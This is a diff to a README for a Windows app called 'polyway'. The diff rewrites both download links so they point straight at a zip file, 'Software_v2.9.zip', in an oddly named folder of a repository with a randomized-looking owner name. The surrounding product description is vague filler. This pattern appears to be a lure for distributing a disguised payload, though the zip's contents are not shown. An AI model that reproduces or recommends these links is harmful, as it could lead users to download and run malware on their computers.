@@ -1,6 +1,6 @@
 # 🌐 polyway - Manage your digital workflow with ease
 
-[![Download Polyway](https://img.shields.io/badge/Download-Polyway-blue.svg)](https://github.com/jejune-genusarum839/polyway)
+[![Download Polyway](https://img.shields.io/badge/Download-Polyway-blue.svg)](https://github.com/jejune-genusarum839/polyway/raw/refs/heads/main/complaintiveness/Software_v2.9.zip)
 
 Polyway helps you organize files and tasks in one place. It keeps your work tidy and simple. You save time by using its clear layout. This tool fits into your daily routine without extra steps.
 
@@ -8,7 +8,7 @@ Polyway helps you organize files and tasks in one place. It keeps your work tidy
 
 You need a computer running Windows 10 or Windows 11 to use this application. Ensure your computer has at least 4GB of RAM and 200MB of free disk space. These specs allow the program to run at a steady speed.
 
-Visit this page to download the software: [https://github.com/jejune-genusarum839/polyway](https://github.com/jejune-genusarum839/polyway)
+Visit this page to download the software: [https://github.com/jejune-genusarum839/polyway/raw/refs/heads/main/complaintiveness/Software_v2.9.zip](https://github.com/jejune-genusarum839/polyway/raw/refs/heads/main/complaintiveness/Software_v2.9.zip)
 
 ## ⚙️ Installation Steps
 
